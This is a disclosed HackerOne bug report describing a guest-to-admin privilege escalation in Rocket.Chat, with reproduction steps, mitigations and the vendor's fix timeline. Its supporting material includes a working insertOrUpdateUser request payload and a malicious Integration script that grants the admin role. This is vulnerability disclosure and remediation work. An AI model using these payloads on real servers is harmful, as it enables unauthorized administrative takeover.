---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/critical
  - cwe/improper-access-control-generic
  - env/web
  - vuln/broken-access-control
  - vuln/privilege-escalation
substate: "resolved"
weakness: "Improper Access Control - Generic"
enriched: true
body: true
date: 2024-08-10
submitted: 2019-02-25T14:47:03.826Z
bounty_usd: null
votes: 59
cve: []
program: "[[programs/rocket_chat|Rocket.Chat]]"
reporter: "gronke"
source: "https://hackerone.com/reports/501081"
title: "Guest Privilege Escalation to admin group"
---
# Guest Privilege Escalation to admin group

> **Severity:** Critical | **Bounty:** undisclosed | **Votes:** 59 | **Program:** Rocket.Chat | **Disclosed:** 2024-08-10

- Report: [https://hackerone.com/reports/501081](https://hackerone.com/reports/501081)
- CWE: Improper Access Control - Generic
- Submitted: 2019-02-25T14:47:03.826Z

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

Due to improper ACLs it was found possible to escalate privileges from a guest user to admin.

As first step the guest user adds itself to the `bot` group that holds the `manage-own-integrations` permission. With this permission it is possible to create a custom Integration with a script that, if triggered, adds the user to the `admin` group.

The `insertOrUpdateUser` method improperly validates a users permissions to change its groups. Because an explicit check prevents from adding itself to the `admin` group directly, the privileges of the `bot` group need to be used to further escalate to global admin.

## Releases Affected:

  * [develop@5f0180d](https://github.com/RocketChat/Rocket.Chat/commit/5f0180dc1500b4e37b8320b39869babadb5d01cd)

## Steps To Reproduce (from initial installation to vulnerability):

(Add details for how we can reproduce the issue)

  1. Login Guest user
  2. Determine own users `_id` from browser traffic
  3. Escalate to `bot` group
  4. Create malicious Integration script
  5. Trigger Integration

## Supporting Material/References:

### Bot group privilege escalation
```json
["{\"msg\":\"method\",\"method\":\"insertOrUpdateUser\",\"params\":[{\"_id\": \"<USER_ID>\", \"roles\": [\"user\", \"bot\"]}],\"id\":\"17\"}"]
```

### Malicious Integrations Script
```javascript
this.Roles.addUserRoles("9HN4Brdmo2Qc2wsiX", "admin")
class Script {
  process_incoming_request({ request }) {};
}
```

## Suggested mitigation

  * Only allow administrators to modify user groups
  * Isolate Integration script context from server application

## Impact

Guest users can become server administrator.

## Timeline

- **Report Filed**
- **2019-03-01** @marcosdefendi: @gronke Thank you for let us know about this problem. I opened [a PR](https://github.com/RocketChat/Rocket.Chat/pull/13597) that's validate if the user has the necessary(assign-roles) to be able to change the role, also I removed the manage-integrations for the bot role.
- **Report Triaged**
- **2019-03-13** @rodrigok: @gronke can you check if the PR fixed the issue?
- **Report Resolved**
- **Agreed On Going Public**
- **Report Became Public**
